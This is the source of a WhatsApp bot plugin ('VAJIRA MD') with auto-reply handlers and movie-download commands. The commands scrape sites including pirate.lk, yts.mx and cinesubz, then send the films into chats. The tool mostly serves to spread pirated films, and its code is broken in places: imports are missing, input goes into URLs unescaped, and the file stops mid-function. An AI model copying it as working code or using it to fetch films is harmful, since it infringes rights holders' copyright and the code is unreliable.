1const config = require('../settings')
const os = require('os')
const fs = require('fs')
const prefix = config.PREFIX
const { cmd, commands } = require('../lib/command')
const devlopernumber = "94711453361"
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson,clockString, jsonformat} = require('../lib/functions')
var { updateCMDStore,isbtnID,getCMDStore,getCmdForCmdId,connectdb,input,get, updb,updfb } = require("../lib/database")
const {
    default: makeWASocket,
    generateWAMessageFromContent,
    prepareWAMessageMedia,
    proto
} = require('@whiskeysockets/baileys')


 function genMsgId() {
  const prefix = "3EB";
  const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  let randomText = prefix;

  for (let i = prefix.length; i < 22; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    randomText += characters.charAt(randomIndex);
  }

  return randomText;
} 

const reportedMessages = {}
//const isBan = banUser.includes(mek.sender)
	    

	
var BOTOW = ''
if(config.LANG === 'SI') BOTOW = "*ඔබ Bot\'s හිමිකරු හෝ  උපපරිපාලක නොවේ !*"
else BOTOW = "*You are not bot\'s owner or moderator !*"

//auto_voice
cmd({
  on: "body"
},    
async (conn, mek, m, { from, body, isOwner }) => {
    const filePath = path.join(__dirname, '../my_data/autovoice.json');
    const data = JSON.parse(fs.readFileSync(filePath, 'utf8'));
    for (const text in data) {
        if (body.toLowerCase() === text.toLowerCase()) {
            const config = await readEnv();
            if (config.AUTO_VOICE === 'true') {
                //if (isOwner) return;        
                await conn.sendPresenceUpdate('recording', from);
                await conn.sendMessage(from, { audio: { url: data[text] }, mimetype: 'audio/mpeg', ptt: true }, { quoted: mek });
            }
        }
    }                
});

//auto sticker 
cmd({
  on: "body"
},    
async (conn, mek, m, { from, body, isOwner }) => {
    const filePath = path.join(__dirname, '../my_data/autosticker.json');
    const data = JSON.parse(fs.readFileSync(filePath, 'utf8'));
    for (const text in data) {
        if (body.toLowerCase() === text.toLowerCase()) {
            const config = await readEnv();
            if (config.AUTO_STICKER === 'true') {
                //if (isOwner) return;        
                await conn.sendMessage(from,{sticker: { url : data[text]},package: 'QUEEN-RASHU-MD'},{ quoted: mek })   
            
            }
        }
    }                
});

//auto reply 
cmd({
  on: "body"
},    
async (conn, mek, m, { from, body, isOwner }) => {
    const filePath = path.join(__dirname, '../my_data/autoreply.json');
    const data = JSON.parse(fs.readFileSync(filePath, 'utf8'));
    for (const text in data) {
        if (body.toLowerCase() === text.toLowerCase()) {
            const config = await readEnv();
            if (config.AUTO_REPLY === 'true') {
                //if (isOwner) return;        
                await m.reply(data[text])
            
            }
        }
    }                
});

cmd({
    pattern: "movie",
    category: "movie",
    react: "🎬",
    desc: "cinesubz & ytsmx & sinhalasub & Firemoviehub movie downloader",
    use: ".movie movie name",
    filename: __filename   
},
    async (conn, mek, m, { reply, isDev, from, l, q, prefix }) => {
        try {
  
        if (!q) return await reply('*Please Give Me Text..! 🖊️*')

const cap = `🎬 VAJIRA MD MOVIE-DL 🎬

Availble movies sites....

- Cinesubz ➱ https://cinesubz.co/
- Sinhalasubs ➱ https://sinhalasub.lk/
- Ytsmx ➱ https://yts.mx/
- Pirate ➱ https://pirate.lk/
- Ginisisila ➱ https://ginisisilacartoon.net/
- Slanimeclub ➱ https://slanimeclub.co/
- Firemovie ➱ https://firemovieshub.com/


Available Subtitle sites....

- Sinhalasubstitle ➱ https://sinhala-subtitles.com/
- Zoom ➱ https://zoom.lk/
- Subz ➱ https://subz.lk/`
		
       if (config.MODE === 'nonbutton') { 
const sections = [
{
	title: "*🎬 SELECT MOVIE SITES 🎬*",
	rows: [
	    {title: "    1", rowId: prefix + `cinesubz ` + q , description: 'Download in Cinesubz'},
            {title: "    2", rowId: prefix + `sinhalasub ` + q , description: 'Download in Sinhalsub'},
	    {title: "    3", rowId: prefix + `ytsmx ` + q , description: 'Download in Ytsmx'},
	    {title: "    4", rowId: prefix + `pirate ` + q , description: 'Download in Pirate'},	
            {title: "    5", rowId: prefix + `slanimeclub ` + q , description: 'Download in Slanimeclub'},
	    {title: "    6", rowId: prefix + `ginisisila ` + q , description: 'Download in Ginisisila'},	
	    {title: "    7", rowId: prefix + `firemovie ` + q , description: 'Download in Firemoviehub'},
      ]
    }, 	  
{
	title: "*🎬 SELECT SUBSTITLE SITES 🎬*",
	rows: [
	    {title: "    8", rowId: prefix + `zoom ` + q , description: 'Download in Zoom'},
            {title: "    9", rowId: prefix + `subz ` + q , description: 'Download in Subz'},
	    {title: "    10", rowId: prefix + `s-subtitle ` + q , description: 'Download in S-subtitle'},
	  
      ]
    }
]

    const listMessage = {
caption: cap,
image : { url: config.LOGO },	    
footer: 'MOVIE DOWNLOADER BY VAJIRA MD',
title: 'Result from Cinezubs & Ytsmx & Firemoviehub and sinhalasub. 📲',
buttonText: '*🔢 Reply below number*',
sections
}
return await conn.replyList(from, listMessage ,{ quoted : mek })


} if (config.MODE === 'button') {

let sections = [{
        title: '*🎬 SELECT MOVIE SITES 🎬*',
        rows: [{
                header: "",
                title: "",
                description: "Download in Cinesubz",
                id: `${prefix}cinesubz ${q}`
            },
            {
                header: "",
                title: "",
                description: "Download in Sinhalasub",
                id: `${prefix}sinhalasub ${q}`
            },
            {
                header: "",
                title: "",
                description: "Download in Ytsmx",
                id: `${prefix}ytsmx ${q}`
            },
            {
                header: "",
                title: "",
                description: "Download in Pirate",
                id: `${prefix}pirate ${q}`
            },
            {
                header: "",
                title: "",
                description: "Download in Slanimeclub",
                id: `${prefix}slanimeclub ${q}`
            },
	    {
                header: "",
                title: "",
                description: "Download in Ginisisila",
                id: `${prefix}ginisisila ${q}`
            },    
            {
                header: "",
                title: "",
                description: "Download in Firemovie",
                id: `${prefix}firemovie ${q}`
            }
        ]
    },
    {
        title: '*🎬 SELECT SUBSTITLE SITES 🎬*',
        rows: [{
                header: "",
                title: "",
                description: "Download in Zoom",
                id: `${prefix}zoom ${q}`
            },
            {
                header: "",
                title: "",
                description: "Download in Subz",
                id: `${prefix}subz ${q}`
            },
            {
                header: "",
                title: "",
                description: "Download in S-Subtitle",
                id: `${prefix}s-subtitle ${q}`
	    }
        ]
    }
]

let listMessage = {
            title: 'Click Here⎙',
            sections
        };
        conn.sendMessage(from, {
            image: { url: config.LOGO },
    caption: cap,
    footer: config.FOOTER,
                buttons: [
		{
                    buttonId: `${prefix}ping ${q}`,
                    buttonText: {
                        displayText: 'PING'
                    },
                },		

                {
                    buttonId: 'action',
                    buttonText: {
                        displayText: 'ini pesan interactiveMeta'
                    },
                    type: 4,
                    nativeFlowInfo: {
                        name: 'single_select',
                        paramsJson: JSON.stringify(listMessage),
                    },
                },
            ],
            headerType: 1,
            viewOnce: true
        }, {
            quoted: m
        });

}
	

		
} catch (e) {
  reply('*ERROR !!*')
  l(e)
}
})



//===============GINISISILA================


cmd({
    pattern: "ginisisila",	
    react: '📑',
    category: "movie",
    desc: "ginisisila cartoon downloader",
    filename: __filename
},
async (conn, m, mek, { from, prefix, q, l, isDev, reply }) => {
try{

        if (!q) return await reply('*Please Give Me Text..! 🖊️*')
	const url = `https://ginisisilacartoon.net/search.php?q=${q}`
     const response = await axios.get(url);
    const $ = cheerio.load(response.data);

    let results = [];
    $("#page_panels_ > table > tbody > tr > td > div").each((c, d) => {
        results.push({
             title: $(d).find("div.video-title").text(),
             date: $(d).find("div.posted-time").text(),
             image: $(d).find("a > img").attr("src"),
             link: $(d).find("a").attr("href"),

        })
    })

if (results.length < 1) return await conn.sendMessage(from, { text: "*මට කිසිවක් සොයාගත නොහැකි විය :(*" }, { quoted: mek } )
var srh = [];  
for (var i = 0; i < results.length; i++) {
srh.push({
title: i + 1,
description: results[i].title  + '+' + results[i].date,
rowId: prefix + 'ginidl ' + results[i].link
});
}
const sections = [{
title: "_[Result from ginisisila.]_",
rows: srh
}]

    const listMessage = {
caption: `🎬 VAJIRA MD MOVIE-DL 🎬

   ⏳ Search A Movie Name: ${q}
📲 Search top 10 Movies\n`,
image : { url: `https://i.ibb.co/0s0WcmF/1og6o9e2.png` },	    
footer: 'MOVIE DOWNLOADER BY TC',
title: 'Search By firemovieshub',
buttonText: '*🔢 Reply below number*',
sections
}
return await conn.replyList(from, listMessage ,{ quoted : mek })
} catch (e) {
  reply('*ERROR !!*')
  l(e)
}
})
	

cmd({
    pattern: "ginidl",	
    filename: __filename
},
async (conn, m, mek, { from, prefix, q, l, isDev, reply }) => {
try{

        if (!q) return await reply('*Please Give Me Text..! 🖊️*')


const genurl = `https://ginisisilacartoon.net/${q}`
		    const response = await axios.get(genurl);
                    const $ = cheerio.load(response.data);
		    const download = $("#player-holder > div > iframe").attr("src");
		    const mtitle = $("#watch-contentHd").text();

const cap = `📃 *Title:* ${mtitle}`
		    
  const sections = [
{
	title: "*🎬 MOVIE-SEARCH-SITE 🎬*",
	rows: [
	    {title: "    1.1", rowId: prefix + `gdrive ${download}` , description: `Download in ${mtitle}`},	
	]
    }	  
]
const listMessage = {
text: cap,
footer: 'MOVIE DOWNLOADER BY VAJIRA MD',
title: 'Search By ginisisila',
buttonText: '*🔢 Reply below number*',
sections
}
return await conn.replyList(from, listMessage ,{ quoted : mek })
} catch (e) {
  reply('*ERROR !!*')
  l(e)
}
})







//====================================







async function GDriveDl(url) {
    let id, res = { "error": true }
    if (!(url && url.match(/drive\.google/i))) return res

    const formatSize = sizeFormatter({
        std: 'JEDEC', decimalPlaces: 2, keepTrailingZeroes: false, render: (literal, symbol) => `${literal} ${symbol}B`
    })

    try {
        id = (url.match(/\/?id=(.+)/i) || url.match(/\/d\/(.*?)\//))[1]
        if (!id) throw 'ID Not Found'
        res = await fetch(`https://drive.google.com/uc?id=${id}&authuser=0&export=download`, {
            method: 'post',
            headers: {
                'accept-encoding': 'gzip, deflate, br',
                'content-length': 0,
                'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'origin': 'https://drive.google.com',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
                'x-client-data': 'CKG1yQEIkbbJAQiitskBCMS2yQEIqZ3KAQioo8oBGLeYygE=',
                'x-drive-first-party': 'DriveWebUi',
                'x-json-requested': 'true'
            }
        })
        let { fileName, sizeBytes, downloadUrl } = JSON.parse((await res.text()).slice(4))
        if (!downloadUrl) throw 'Link Download Limit!'
        let data = await fetch(downloadUrl)
        if (data.status !== 200) return data.statusText
        return { downloadUrl, fileName, fileSize: formatSize(sizeBytes), mimetype: data.headers.get('content-type') }
    } catch (e) {
        console.log(e)
        return res
    }
}




cmd({
    pattern: "pirate",	
    react: '📑',
    category: "movie",
    desc: "pirate moive downloader",
    filename: __filename
},
async (conn, m, mek, { from, prefix, q, l, isDev, reply }) => {
try{

        if (!q) return await reply('*Please Give Me Text..! 🖊️*')
	

const data = await fetchJson(`${config.API}/api/pirate/search?q=${q}&apikey=${config.APIKEY}`)

	
if (data.data.data.data.length < 1) return await conn.sendMessage(from, { text: "*මට කිසිවක් සොයාගත නොහැකි විය :(*" }, { quoted: mek } )
var srh = [];  
for (var i = 0; i < data.data.data.data.length; i++) {
srh.push({
title: i + 1,
description: `${data.data.data.data[i].title} | ${data.data.data.data[i].rating}`,
rowId: prefix + 'piratein ' + data.data.data.data[i].link
});
}
const sections = [{
title: "_[Result from pirate.]_",
rows: srh
    }	  				 
 ]

    const listMessage = {
text: ``,
footer: config.FOOTER,
title: 'Result from pirate. 📲',
buttonText: '*🔢 Reply below number*',
sections
}
return await conn.replyList(from, listMessage ,{ quoted : mek })
} catch (e) {
  reply('*ERROR !!*')
  l(e)
}
})





cmd({
    pattern: "piratein",	
    react: '📑',
    filename: __filename
},
async (conn, m, mek, { from, prefix, q, l, isDev, reply }) => {
try{
if (!q) return await reply('*Please Give Me Text..! 🖊️*')
const data = await fetchJson(`${config.API}/api/pirate/movie?url=${q}&apikey=${config.APIKEY}`)
		    
if (data.data.data.dllinks.directDownloadLinks.length < 1) return await conn.sendMessage(from, { text: "*මට කිසිවක් සොයාගත නොහැකි විය :(*" }, { quoted: mek } )
var srhss = [];
	
for (var i = 0; i < data.data.data.dllinks.directDownloadLinks.length; i++) {
srhss.push({
title: i + 1,
description: data.data.data.dllinks.directDownloadLinks[i].quality + ' | ' + data.data.data.dllinks.directDownloadLinks[i].size + ' | ' + data.data.data.dllinks.directDownloadLinks[i].platform,
rowId: prefix + `piratedl ${data.data.data.dllinks.directDownloadLinks[i].link}|${data.data.data.mainDetails.maintitle}|${data.data.data.moviedata.imageUrls[0]}`
});
}
	
const sections = [
{
title: "_Select Movie_",
rows: srhss
        },	
{
	title: "*🎬 MOVIE INFO 🎬*",
	rows: [
	    {title: "    1.1", rowId: prefix + `pirates ${q}` , description: 'Send Movie Details 📄'},

       ]
    },	
{
	title: "*🎬 MOVIE IMAGES 🎬*",
	rows: [
	    {title: "    1.2", rowId: prefix + `piratei ${q}` , description: 'Send Movie IMAGES 🏞️'},

       ]
    }
]
const listMessage = {
caption: `*_☘ Title: ${data.data.data.mainDetails.maintitle}_*

- *Year:* ${data.data.data.mainDetails.dateCreated}
- *Rating:* ${data.data.data.mainDetails.runtime}
- *ImdbRating* ${data.data.data.moviedata.imdbRating}
- *ImdbvotesCount* ${data.data.data.moviedata.imdbvotesCount}

*⛏️ Link:* ${q}`,
image : { url: data.data.data.mainDetails.imageUrl },	
footer: 'MOVIE DOWNLOADER BY TDD',
title: '',
buttonText: '*🔢 Reply below number*',
sections
}
return await conn.replyList(from, listMessage ,{ quoted : mek })	
} catch (e) {
  reply('*ERROR !!*')
  l(e)
}
})




cmd({
    pattern: "pirates",
    react: '⬆',    
    dontAddCommandList: true,
    filename: __filename
},
    async (conn, mek, m, { reply, isDev, from, q, prefix }) => {
        try {
        
        if (!q) return await reply('*Please Give Me Link..! 🖊️*')

const data = await fetchJson(`${config.API}/api/pirate/movie?url=${q}&apikey=${config.APIKEY}`)
const msg = `*_☘ Title: ${data.data.data.mainDetails.maintitle}_*

- *Year:* ${data.data.data.mainDetails.dateCreated}
- *Rating:* ${data.data.data.mainDetails.runtime}
- *ImdbRating* ${data.data.data.moviedata.imdbRating}
- *ImdbvotesCount* ${data.data.data.moviedata.imdbvotesCount}

*⛏️ Link:* ${q}

${config.FOOTER}`
		
return await conn.sendMessage(from, { image: { url:data.data.data.moviedata.imageUrls[0] } , caption: msg } , { quoted: mek })

} catch (e) {
reply('*_First activate location sender_*\n\n- Eg:- .activate\n- Then reply 1.1')
            console.log(e)
            }
    })       



cmd({
    pattern: "piratei",
    react: '⬆',    
    dontAddCommandList: true,
    filename: __filename
},
    async (conn, mek, m, { reply, isDev, from, q, prefix }) => {
        try {
        
        if (!q) return await reply('*Please Give Me Link..! 🖊️*')
		
		
const data = await fetchJson(`${config.API}/api/pirate/movie?url=${q}&apikey=${config.APIKEY}`)
		
const msg = config.FOOTER

reply('UPLOADING MOVIE IMAGES 🔄')

await conn.sendMessage(from, { image: { url:data.data.data.moviedata.imageUrls[0] } , caption: msg } , { quoted: mek })
await conn.sendMessage(from, { image: { url:data.data.data.moviedata.imageUrls[1] } , caption: msg } , { quoted: mek })
await conn.sendMessage(from, { image: { url:data.data.data.moviedata.imageUrls[2] } , caption: msg } , { quoted: mek })
await conn.sendMessage(from, { image: { url:data.data.data.moviedata.imageUrls[4] } , caption: msg } , { quoted: mek })
await conn.sendMessage(from, { image: { url:data.data.data.moviedata.imageUrls[5] } , caption: msg } , { quoted: mek })
await conn.sendMessage(from, { react: { text: `✅`, key: mek.key }}) 

} catch (e) {
reply('*_First activate location sender_*\n\n- Eg:- .activate\n- Then reply 1.1')
            console.log(e)
            }
    })       




cmd({
    pattern: `piratedl`,
    react: "📥",
    dontAddCommandList: true,
    filename: __filename
}, async (conn, mek, m, { from, q, isDev, reply }) => {
	
    if (!q) {
        return await reply('*Please provide a direct URL!*');
    }


    try {
   
        
        const mediaUrl = q.split("|")[0]
        const title = q.split("|")[1]  || 'tdd_movie_dl_system'
        const image = q.split("|")[2] 
	    
const data = await fetchJson(`${config.API}/api/pirate/download?url=${mediaUrl}&apikey=${config.APIKEY}`)
	const dl = `${data.data.data.link}`
const dls = dl.replace("u" , "api/file")
console.log(dl)
console.log(dls)      

reply('╭═════════════════❀\n│  UPLOADING YOUR MOVIE 📥\n│ ❀ Target : WAIT FEW MINUTES...\n│ ❀ Use commands after come the movie\n│ ❀ Device : 1/3\n╰═════════════════❀')



if (dl.includes("https://pixeldrain.com")) {    
	    

const message = {
            document: await getBuffer(dls),
	    caption: `${title}\n${config.FOOTER}`,
            mimetype: "video/mp4",
            fileName: `${title}.mp4`,
        };	    
        await conn.sendMessage(from, message );	
        

} if (dl.includes("https://www.amdahost.com")) {    

	

const message = {
            document: await getBuffer(dl),
	    caption: `${title}\n${config.FOOTER}`,
            mimetype: "video/mp4",
            fileName: `${title}.mp4`,
        };	    
        await conn.sendMessage(from, message );	
        
}

        await conn.sendMessage(from, { react: { text: '✅', key: mek.key } });
    } catch (error) {
        console.error('Error fetching or sending', error);
        await conn.sendMessage(from, '*Error fetching or sending *', { quoted: mek });
    }
});




cmd({
    pattern: "slanimeclub",	
    react: '📑',
    category: "movie",
    desc: "slanimeclub movie downloader",
    filename: __filename
},
async (conn, m, mek, { from, prefix, q, l, isDev, reply }) => {
try{

        if (!q) return await reply('*Please Give Me Text..! 🖊️*')
	

const data = await fetchJson(`${config.API}/api/slanimeclub/search?q=${q}&apikey=${config.APIKEY}`)



	
if (data.data.data.data.length < 1) return await conn.sendMessage(from, { text: "*මට කිසිවක් සොයාගත නොහැකි විය :(*" }, { quoted: mek } )
var srh = [];  
for (var i = 0; i < data.data.data.data.length; i++) {
srh.push({
title: i + 1,
description: data.data.data.data[i].title,
rowId: prefix + 'slanime ' + data.data.data.data[i].link
});
}
const sections = [{
title: "_[Result from slanimeclub.]_",
rows: srh
    }	  				 
 ]

    const listMessage = {
text: ``,
footer: config.FOOTER,
title: 'Result from slanimeclub. 📲',
buttonText: '*🔢 Reply below number*',
sections
}
return await conn.replyList(from, listMessage ,{ quoted : mek })
} catch (e) {
  reply('*ERROR !!*')
  l(e)
}
})








cmd({
    pattern: "slanime",	
    react: '📑',
    category: "movie",
    desc: "slanimeclub moive downloader",
    filename: __filename
},
async (conn, m, mek, { from, prefix, q, l, isDev, reply }) => {
try{

        if (!q) return await reply('*Please Give Me Text..! 🖊️*')
	

const data = await fetchJson(`${config.API}/api/slanimeclub/movie?url=${q}&apikey=${config.APIKEY}`)

const cap = `*_☘ Title: ${data.data.data.moviedata.title}_*

- *Date:* ${data.data.data.moviedata.date}
- *Generous* ${data.data.data.moviedata.generous}

*⛏️ Link:* ${q}`


	
if (data.data.data.moviedata.seasons.length < 1) return await conn.sendMessage(from, { text: "*මට කිසිවක් සොයාගත නොහැකි විය :(*" }, { quoted: mek } )
var srh = [];  
for (var i = 0; i < data.data.data.moviedata.seasons.length; i++) {
srh.push({
title: i + 1,
description: `${data.data.data.moviedata.seasons[i].title} | ${data.data.data.moviedata.seasons[i].number} | ${data.data.data.moviedata.seasons[i].date}`,
rowId: prefix + `slanimedl ${data.data.data.moviedata.seasons[i].link}|${data.data.data.moviedata.seasons[i].title}`
});
}
const sections = [{
title: "_[Result from slanimeclub.]_",
rows: srh
    }	  				 
 ]

    const listMessage = {	    
caption: cap,
image : { url: data.data.data.moviedata.image },		    
footer: config.FOOTER,
title: 'Result from slanimeclub. 📲',
buttonText: '*🔢 Reply below number*',
sections
}
return await conn.replyList(from, listMessage ,{ quoted : mek })
} catch (e) {
  reply('*ERROR !!*')
  l(e)
}
})



cmd({
    pattern: `slanimedl`,
    react: "📥",
    dontAddCommandList: true,
    filename: __filename
}, async (conn, mek, m, { from, q, isDev, reply }) => {
	
    if (!q) {
        return await reply('*Please provide a direct URL!*');
    }


    try {
   
       
	   
        const mediaUrl = q.split("|")[0]
        const title = q.split("|")[1]  || 'tdd_movie_dl_system'
        const data = await fetchJson(`${config.API}/api/slanimeclub/download?url=${mediaUrl}&apikey=${config.APIKEY}`)
        const dl_link = `${data.data.data.link}`

reply('╭═════════════════❀\n│  UPLOADING YOUR MOVIE 📥\n│ ❀ Target : WAIT FEW MINUTES...\n│ ❀ Use commands after come the movie\n│ ❀ Device : 1/3\n╰═════════════════❀')


if (dl_link.includes("https://slanimeclub.co")) {    
	    
    const message = {
            document: await getBuffer(dl_link),
	    caption: `${title}\n\n${config.FOOTER}`,
            mimetype: "video/mp4",
            fileName: `${title}.mp4`,
        };	    
        await conn.sendMessage(from, message );

} if (dl_link.includes("https://drive.google.com")) {


let res = await GDriveDl(dl_link)
		let txt = `*[ Downloading file ]*\n\n`
		txt += `*Name :* ${res.fileName}\n`
		txt += `*Size :* ${res.fileSize}\n`
		txt += `*Type :* ${res.mimetype}`	
        await reply(txt)
conn.sendMessage(from, { document: { url: res.downloadUrl }, caption: `${res.fileName}\n\n${config.FOOTER}`, fileName: res.fileName, mimetype: res.mimetype }, { quoted: mek })

}

        await conn.sendMessage(from, { react: { text: '✅', key: mek.key } });
    } catch (error) {
        console.error('Error fetching or sending', error);
        await conn.sendMessage(from, '*Error fetching or sending *', { quoted: mek });
    }
});




cmd({
    pattern: "cinesubz",	
    react: '📑',
    category: "movie",
    desc: "cinesubz moive downloader",
    filename: __filename
},
async (conn, m, mek, { from, prefix, q, l, isDev, reply }) => {
try{

        if (!q) return await reply('*Please Give Me Text..! 🖊️*')
	

const data = await fetchJson(`${config.API}/api/cinesubz/search?q=${q}&apikey=${config.APIKEY}`)

	
if (data.data.data.data.length < 1) return await conn.sendMessage(from, { text: "*මට කිසිවක් සොයාගත නොහැකි විය :(*" }, { quoted: mek } )
var srh = [];  
for (var i = 0; i < data.data.data.data.length; i++) {
srh.push({
title: i + 1,
description: data.data.data.data[i].title,
rowId: prefix + 'cine ' + data.data.data.data[i].link
});
}
const sections = [{
title: "_[Result from cinesubz.]_",
rows: srh
    }	  				 
 ]

    const listMessage = {
text: ``,
footer: config.FOOTER,
title: 'Result from cinesubz. 📲',
buttonText: '*🔢 Reply below number*',
sections
}
return await conn.replyList(from, listMessage ,{ quoted : mek })
} catch (e) {
  reply('*ERROR !!*')
  l(e)
}
})



cmd({
    pattern: "cine",	
    react: '📑',
    filename: __filename
},
async (conn, m, mek, { from, prefix, q, l, isDev, reply }) => {
try{
if (!q) return await reply('*Please Give Me Text..! 🖊️*')



const data = await fetchJson(`${config.API}/api/cinesubz/movie?url=${q}&apikey=${config.APIKEY}`)


const cap1 = `*_☘ Title: ${data.data.data.moviedata.title}_*

- *Year:* ${data.data.data.mainDetails.dateCreated}
- *Rating:* ${data.data.data.mainDetails.runtime}
- *Count* ${data.data.data.mainDetails.rating.count}
- *Value* ${data.data.data.mainDetails.rating.value}

*⛏️ Link:* ${q}`


const response = await axios.get(q);  
const $ = cheerio.load(response.data);
  
const image = $("div.poster > img").attr("src")
const image2 = $("p > img.aligncenter.size-full.wp-image-93256").attr("src")
const title = $("div.data > h1").text()
const type = $("span > a").text()
const genre = $("div.data > div.sgeneros > a").text()
const date = $("div.extra > span.date").text()
const desc = $("div:nth-child(16)").text()
const rating = $("#repimdb > strong").text()
const fdate = $("#info > div:nth-child(6) > span").text()
const ldate = $("#info > div:nth-child(7) > span").text()


const results = [];
    $("div.se-a > ul.episodios > li").each((c, d) => {

        results.push({

   
      link: $(d).find("a").attr("href"),
       id: $(d).find("div.numerando").text(),
       title: $(d).find("div.episodiotitle > a").text()
          

      })    
        })
	

const cap2 = `*_☘ Title: ${title}*

- *Year:* ${date}
- *Rating:* ${rating}
- *Type:* ${type}
- *Generos:* ${genre}

⛏️ *Link:* ${q}`

	
	



if (q.includes("https://cinesubz.co/movies")) {	




	
if (data.data.data.dllinks.directDownloadLinks.length < 1) return await conn.sendMessage(from, { text: "*මට කිසිවක් සොයාගත නොහැකි විය :(*" }, { quoted: mek } )
var srhss = [];
	
for (var i = 0; i < data.data.data.dllinks.directDownloadLinks.length; i++) {
srhss.push({
title: i + 1,
description: data.data.data.dllinks.directDownloadLinks[i].quality + ' | ' + data.data.data.dllinks.directDownloadLinks[i].size,
rowId: prefix + `cinedls ${data.data.data.dllinks.directDownloadLinks[i].link}`
});
}
	
const sections = [
{
title: "_Select Movie_",
rows: srhss
        },	
{
	title: "*🎬 MOVIE INFO 🎬*",
	rows: [
	    {title: "    1.1", rowId: prefix + `cines ${q}` , description: 'Send Movie Details 📄'},

       ]
    },	
{
	title: "*🎬 MOVIE IMAGES 🎬*",
	rows: [
	    {title: "    1.2", rowId: prefix + `cinei ${q}` , description: 'Send Movie IMAGES 🏞️'},

       ]
    }
]
const listMessage = {
caption: cap1,
image : { url: data.data.data.mainDetails.imageUrl },	
footer: config.FOOTER,
title: '',
buttonText: '*🔢 Reply below number*',
sections
}
return await conn.replyList(from, listMessage ,{ quoted : mek })	

}  
	
if (q.includes("https://cinesubz.co/tvshows")) {
	

	
if (results.length < 1) return await conn.sendMessage(from, { text: "*මට කිසිවක් සොයාගත නොහැකි විය :(*" }, { quoted: mek } )
var srhss = [];
	
for (var i = 0; i < results.length; i++) {
srhss.push({
title: i + 1,
description: results[i].title + ' | ' + results[i].id,
rowId: prefix + `cinetv ${results[i].link}`
});
}
	
const sections = [
{
title: "_Select Episode_",
rows: srhss
    },	
{
	title: "*🎬 MOVIE INFO 🎬*",
	rows: [
	    {title: "    1.1", rowId: prefix + `cines ${q}` , description: 'Send Movie Details 📄'},

       ]
    },	
{
	title: "*🎬 MOVIE IMAGES 🎬*",
	rows: [
	    {title: "    1.2", rowId: prefix + `cinei ${q}` , description: 'Send Movie IMAGES 🏞️'},

       ]
    }
]


const listMessage = {
caption: cap2,	
image : { url: image },	
footer: config.FOOTER,
title: '',
buttonText: '*🔢 Reply below number*',
sections
}
return await conn.replyList(from, listMessage ,{ quoted : mek })	

}	
	
} catch (e) {
  reply('*ERROR !!*')
  l(e)
}
})



cmd({
    pattern: "cinetv",	
    react: '📑',
    filename: __filename
},
async (conn, m, mek, { from, prefix, q, l, isDev, reply }) => {
try{
if (!q) return await reply('*Please Give Me Text..! 🖊️*')

const data = await fetchJson(`${config.API}/api/cinesubz/episode?url=${q}&apikey=${config.APIKEY}`)
	    
if (data.data.data.dllinks.directDownloadLinks.length < 1) return await conn.sendMessage(from, { text: "*මට කිසිවක් සොයාගත නොහැකි විය :(*" }, { quoted: mek } )
var srhss = [];
	
for (var i = 0; i < data.data.data.dllinks.directDownloadLinks.length; i++) {
srhss.push({
title: i + 1,
description: data.data.data.dllinks.directDownloadLinks[i].quality + ' | ' + data.data.data.dllinks.directDownloadLinks[i].size,
rowId: prefix + `cinedls ${data.data.data.dllinks.directDownloadLinks[i].link}`
});
}
	
const sections = [
{
title: "_Select Movie_",
rows: srhss
    }
]
const listMessage = {
caption: `*_☘ Title: ${data.data.data.mainDetails.title}_*

- *EpisodeTitle:* ${data.data.data.mainDetails.episodeTitle}
- *Year:* ${data.data.data.mainDetails.date}
- *Completeness* ${data.data.data.mainDetails.completeness}

*⛏️ Link:* ${q}`	,
image : { url: data.data.data.imageUrls[0] },	
footer: config.FOOTER,
title: '',
buttonText: '*🔢 Reply below number*',
sections
}
return await conn.replyList(from, listMessage ,{ quoted : mek })	

} catch (e) {
  reply('*ERROR !!*')
  l(e)
}
})
	


cmd({
    pattern: "cinedls",	
    react: '📑',
    filename: __filename
},
async (conn, m, mek, { from, prefix, q, l, isDev, reply }) => {
try{

        if (!q) return await reply('*Please Give Me Text..! 🖊️*')
	

const data = await fetchJson(`${config.API}/api/cinesubz/download?url=${q}&apikey=${config.APIKEY}`)

	const downloads = data.data.data;

    if (!downloads || downloads.length === 0) {
      return reply("No download links found.");
    }

    // Format and send download links
    let messages = `*🎥 Cinesubz Download Links 🎥*\n\n`;
    downloads.forEach((item, index) => {
      messages += `*${index + 1}. ${item.fileName}*\n`;
      messages += `📦 Size: ${item.fileSize}\n`;
      messages += `🔗 Type: ${item.type}\n===============================\n`;
    });

if (downloads < 1) return await conn.sendMessage(from, { text: "*මට කිසිවක් සොයාගත නොහැකි විය :(*" }, { quoted: mek } )
var srh = [];  
for (var i = 0; i < downloads.length; i++) {
srh.push({
title: i + 1,
description: `${downloads[i].type} | ${downloads[i].fileSize}`,
rowId: prefix + `cinedl ${downloads[i].href}|${downloads[i].fileName}`
});
}
const sections = [{
title: "_[Result from cinesubz.]_",
rows: srh
    }	  				 
 ]

    const listMessage = {
text: messages,
footer: config.FOOTER,
title: 'Result from cinesubz. 📲',
buttonText: '*🔢 Reply below number*',
sections
}
return await conn.replyList(from, listMessage ,{ quoted : mek })



} catch (e) {
  reply('*ERROR !!*')
  l(e)
}
})





cmd({
    pattern: "cines",
    react: '⬆',    
    dontAddCommandList: true,
    filename: __filename
},
    async (conn, mek, m, { reply, isDev, from, q, prefix }) => {
        try {
        
        if (!q) return await reply('*Please Give Me Link..! 🖊️*')
        
        
if (q.includes("https://cinesubz.co/movies")) {
		
		
		
const data = await fetchJson(`${config.API}/api/cinesubz/movie?url=${q}&apikey=${config.APIKEY}`)
const msg = `*_☘ Title: ${data.data.data.moviedata.title}_*

- *Year:* ${data.data.data.mainDetails.dateCreated}
- *Rating:* ${data.data.data.mainDetails.runtime}
- *Count* ${data.data.data.mainDetails.rating.count}
- *Value* ${data.data.data.mainDetails.rating.value}

*⛏️ Link:* ${q}

${config.FOOTER}`
return await conn.sendMessage(from, { image: { url:data.data.data.mainDetails.imageUrl } , caption: msg } , { quoted: mek })
await conn.sendMessage(from, { react: { text: `✅`, key: mek.key }}) 
	
	
	
} if (q.includes("https://cinesubz.co/tvshows")) {



const data = await fetchJson(`${config.API}/api/cinesubz/episodes?url=${q}&apikey=${config.APIKEY}`)
